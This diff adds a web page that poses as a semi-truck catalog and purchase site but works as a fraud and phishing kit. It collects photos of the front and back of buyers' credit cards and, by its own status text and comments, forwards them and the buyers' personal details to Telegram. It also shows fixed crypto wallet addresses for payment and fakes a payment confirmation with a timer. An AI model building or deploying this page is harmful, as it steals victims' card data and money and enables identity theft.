@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Semi-Truck Catalog & Purchase</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+        .app-container { max-width: 800px; margin: 30px auto; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); padding: 30px; }
+        h1, h2 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
+        .truck-card { background: #f9f9f9; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #007bff; display: flex; justify-content: space-between; align-items: center; }
+        .price { font-weight: bold; color: #dc3545; font-size: 1.3em; }
+        .btn { background-color: #28a745; color: white; padding: 10px 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; transition: background-color 0.3s; }
+        .btn:hover { background-color: #218838; }
+        input[type="file"], input[type="text"], select, textarea { width: 100%; padding: 10px; margin-top: 5px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        #wallet-info { background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
+        .address-box { font-family: monospace; color: #333; word-break: break-all; margin-top: 5px; background: #fff; padding: 8px; border: 1px dashed #adb5bd; }
+        .form-group { margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <h1>🚛 Semi-Truck Purchase System</h1>
+        
+        <div id="app-canvas">
+            </div>
+
+    </div>
+
+<script>
+    // --- GLOBAL STATE ---
+    let orderState = {
+        truckId: null,
+        truckName: null,
+        orderId: null,
+        paymentMethod: null,
+        cardFrontFile: null, 
+        cardBackFile: null,
+    };
+
+    const WALLETS = {
+        'BTC': 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7',
+        'ETH': '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca',
+        'USDT_ERC20': '0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA'
+    };
+
+    // NOTE: Ensure your 'images/' folder exists with these file names!
+    const TRUCKS = [
+        { id: 'PB579-21', name: 'Peterbilt 579 (2021)', info: '2021 Sleeper with ~479k miles.', price: '$47,950', imageUrl: './images/peterbilt-579-2021.jpg' },
+        { id: 'PB579-19', name: 'Peterbilt 579 (2019)', info: '2019 Used Sleeper Tractor.', price: '$44,950', imageUrl: './images/peterbilt-579-2019.jpg' },
+        { id: 'KW680-21', name: 'Kenworth T680 (2021)', info: '2021 Sleeper with ~177k miles.', price: '$69,000', imageUrl: './images/kenworth-t680-2021.jpg' },
+        { id: 'KW680-19', name: 'Kenworth T680 (2019)', info: '2019 Used Sleeper (Various Mileages).', price: '$56,000', imageUrl: './images/kenworth-t680-2019.jpg' },
+        { id: 'FLC-21', name: 'Freightliner Cascadia (2021)', info: '2021 Used Cascadia (125/126 Series).', price: '$76,500', imageUrl: './images/freightliner-cascadia-2021.jpg' },
+        { id: 'FLC-12', name: 'Freightliner Cascadia (2012)', info: '2012 Day-Cab with ~520k miles.', price: '$28,000', imageUrl: './images/freightliner-cascadia-2012.jpg' },
+        { id: 'PB389-16', name: 'Peterbilt 389 (2016)', info: '2016 Sleeper, ~656k miles (Classic Look).', price: '$69,900', imageUrl: './images/peterbilt-389.jpg' },
+        { id: 'VVNL-20', name: 'Volvo VNL 670 (2020)', info: '2020 Used VNL 670 Tractor.', price: '$75,000', imageUrl: './images/volvo-vnl-670.jpg' },
+        { id: 'MACK-21', name: 'Mack Anthem (2021)', info: '2021 Used Mack Anthem Sleeper.', price: '$80,000', imageUrl: './images/mack-anthem-2021.jpg' },
+        { id: 'INT-LT', name: 'International ProStar / LT', info: '2014-2021 Used Model Range.', price: '$45,000', imageUrl: './images/international-lt.jpg' }
+    ];
+
+    const canvas = document.getElementById('app-canvas');
+
+    // --- VIEW RENDERING FUNCTIONS ---
+
+    // View 1: Truck Listing
+    function renderCatalog() {
+        let content = '<h2>1. Select Your Truck</h2>';
+        TRUCKS.forEach(truck => {
+            content += `
+                <div class="truck-card">
+                    <div style="display:flex; align-items:center;">
+                        <img src="${truck.imageUrl}" alt="${truck.name}" style="width: 100px; height: 60px; object-fit: cover; margin-right: 15px; border-radius: 4px;">
+                        
+                        <div>
+                            <h3>${truck.name}</h3>
+                            <p>${truck.info}</p>
+                            <p class="price">${truck.price}</p>
+                        </div>
+                    </div>
+                    <button class="btn" onclick="startPurchase('${truck.id}', '${truck.name}')">Buy Now</button>
+                </div>
+            `;
+        });
+        canvas.innerHTML = content;
+    }
+
+    // View 2: Credit Card Verification
+    function renderCardVerification() {
+        canvas.innerHTML = `
+            <h2>2. Credit Card Verification (Step 1/3)</h2>
+            <p>You are purchasing: <strong>${orderState.truckName}</strong></p>
+            <p style="color:red; font-weight:bold;">⚠️ **NOTE:** This is a non-standard verification step for high-value crypto orders. Please upload clear pictures of the **FRONT** and **BACK** of your credit card. For security, we assume you have covered the card number and CVV in the photo. </p>
+            
+            <form id="card-upload-form">
+                <div class="form-group">
+                    <label for="card-front">Credit Card Front Image:</label>
+                    <input type="file" id="card-front" name="cardFront" accept="image/*" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-back">Credit Card Back Image:</label>
+                    <input type="file" id="card-back" name="cardBack" accept="image/*" required>
+                </div>
+                <button type="submit" class="btn">Proceed to Payment Selection</button>
+            </form>
+            <p id="message" style="margin-top: 20px; font-weight: bold;"></p>
+        `;
+
+        document.getElementById('card-upload-form').addEventListener('submit', handleCardUpload);
+    }
+
+    // View 3: Payment Selection
+    function renderPaymentSelection() {
+        canvas.innerHTML = `
+            <h2>3. Payment Selection (Step 2/3)</h2>
+            <p>Order ID: <strong>${orderState.orderId}</strong> for <strong>${orderState.truckName}</strong></p>
+
+            <div class="form-group">
+                <label for="payment-select">Select Payment Method:</label>
+                <select id="payment-select">
+                    <option value="" disabled selected>Choose a Crypto Method</option>
+                    <option value="BTC">Bitcoin (BTC)</option>
+                    <option value="ETH">Ethereum (ETH)</option>
+                    <option value="USDT_ERC20">USDT (ERC20)</option>
+                </select>
+            </div>
+
+            <div id="wallet-info">
+                <p>Please send the **EXACT** truck price to the wallet address below. Once sent, click **"I Have Sent Payment"**.</p>
+                <h3>Wallet Address:</h3>
+                <div id="address-display" class="address-box"></div>
+                <button class="btn" style="background-color:#28a745; margin-top:15px;" onclick="startConfirmation()">I Have Sent Payment</button>
+            </div>
+
+            <div id="timer-box" style="display: none; text-align: center; margin-top: 20px;">
+                <h2>Confirming Your Payment...</h2>
+                <p>Please hold for: <strong id="timer">20</strong> seconds.</p>
+            </div>
+        `;
+        document.getElementById('payment-select').addEventListener('change', handlePaymentSelect);
+    }
+
+    // View 4: Delivery Details
+    function renderDeliveryDetails() {
+        canvas.innerHTML = `
+            <h2>4. Delivery Details (Step 3/3)</h2>
+            <p>Finalizing order <strong>${orderState.orderId}</strong> for <strong>${orderState.truckName}</strong></p>
+            
+            <form id="delivery-form">
+                <div class="form-group"><label for="name">Name:</label><input type="text" id="name" name="name" required></div>
+                <div class="form-group">
+                    <label for="gender">Gender:</label>
+                    <select id="gender" name="gender" required>
+                        <option value="" disabled selected>Select Gender</option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                    </select>
+                </div>
+                <div class="form-group"><label for="email">Email:</label><input type="email" id="email" name="email" required></div>
+                <div class="form-group"><label for="phone">Phone Number:</label><input type="tel" id="phone" name="phone" required></div>
+                <div class="form-group"><label for="country">Country:</label><input type="text" id="country" name="country" required></div>
+                <div class="form-group"><label for="state">State:</label><input type="text" id="state" name="state" required></div>
+                <div class="form-group"><label for="address">Address:</label><textarea id="address" name="address" rows="3" required></textarea></div>
+                
+                <button type="submit" class="btn">Submit Final Order</button>
+            </form>
+        `;
+        document.getElementById('delivery-form').addEventListener('submit', handleFinalSubmission);
+    }
+
+    // View 5: Order Received
+    function renderOrderReceived() {
+        canvas.innerHTML = `
+            <div style="text-align:center;">
+                <div style="font-size: 5em; color: #28a745; margin-bottom: 20px;">🎉</div>
+                <h2>Order Received Successfully!</h2>
+                <p>Thank you for securing your purchase of the <strong>${orderState.truckName}</strong> (Order ID: ${orderState.orderId}).</p>
+                <p>Please hold while a personnel contacts you for further discussions on the **delivery date** and confirmation of your payment.</p>
+                <p>You may now close this page.</p>
+            </div>
+        `;
+    }
+
+    // --- HANDLERS AND LOGIC ---
+
+    function startPurchase(truckId, truckName) {
+        orderState.truckId = truckId;
+        orderState.truckName = truckName;
+        renderCardVerification();
+    }
+
+    async function handleCardUpload(e) {
+        e.preventDefault();
+        const messageElement = document.getElementById('message');
+        messageElement.textContent = "Uploading images and sending to Telegram...";
+
+        const formData = new FormData();
+        orderState.cardFrontFile = document.getElementById('card-front').files[0];
+        orderState.cardBackFile = document.getElementById('card-back').files[0];
+
+        formData.append('cardFront', orderState.cardFrontFile);
+        formData.append('cardBack', orderState.cardBackFile);
+        formData.append('truckId', orderState.truckId);
+        formData.append('truckName', orderState.truckName);
+        
+        try {
+            // CALLING VERCEL SERVERLESS FUNCTION HERE: /api/telegram-upload
+            const response = await fetch('/api/telegram-upload', {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (response.ok) {
+                 orderState.orderId = result.orderId; // Get unique ID from server
+                 messageElement.style.color = 'green';
+                 messageElement.textContent = `Success! Verification received. Order ID: ${orderState.orderId}. Proceeding...`;
+                 
+                 setTimeout(renderPaymentSelection, 1500);
+
+            } else {
+                messageElement.style.color = 'red';
+                messageElement.textContent = `Error: ${result.message || 'Could not process upload.'}`;
+            }
+
+        } catch (error) {
+            messageElement.style.color = 'red';
+            messageElement.textContent = `A network error occurred: ${error.message}`;
+        }
+    }
+
+    function handlePaymentSelect(e) {
+        const method = e.target.value;
+        const address = WALLETS[method];
+        
+        if (address) {
+            document.getElementById('address-display').textContent = address;
+            document.getElementById('wallet-info').style.display = 'block';
+            orderState.paymentMethod = method;
+        } else {
+            document.getElementById('wallet-info').style.display = 'none';
+        }
+    }
+
+    function startConfirmation() {
+        document.getElementById('wallet-info').style.display = 'none';
+        const timerBox = document.getElementById('timer-box');
+        timerBox.style.display = 'block';
+        let seconds = 20;
+        document.getElementById('timer').textContent = seconds;
+
+        const countdown = setInterval(() => {
+            seconds--;
+            document.getElementById('timer').textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                renderDeliveryDetails();
+            }
+        }, 1000);
+    }
+
+    async function handleFinalSubmission(e) {
+        e.preventDefault();
+        
+        // Collect delivery data
+        const formData = new FormData(e.target);
+        const deliveryData = {};
+        formData.forEach((value, key) => deliveryData[key] = value);
+
+        // --- FINAL API CALL START ---
+        
+        const finalSubmission = {
+            orderId: orderState.orderId,
+            truckName: orderState.truckName,
+            paymentMethod: orderState.paymentMethod,
+            delivery: deliveryData
+        };
+        
+        try {
+            // NOTE: You must create an 'api/final-order.js' Vercel function to receive this data
+            // and send the final, complete order details to Telegram.
+            const response = await fetch('/api/final-order', { 
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(finalSubmission)
+            });
+            
+            if (response.ok) {
+                renderOrderReceived();
+            } else {
+                // Handle server error response here
+                alert("Error submitting final order. Please check the console.");
+            }
+        } catch (error) {
+            console.error("Final submission error:", error);
+            alert("A network error occurred during final submission.");
+        }
+        
+        // --- FINAL API CALL END ---
+    }
+
+    // --- INITIALIZATION ---
+    document.addEventListener('DOMContentLoaded', renderCatalog);
+</script>
+</body>
+</html>
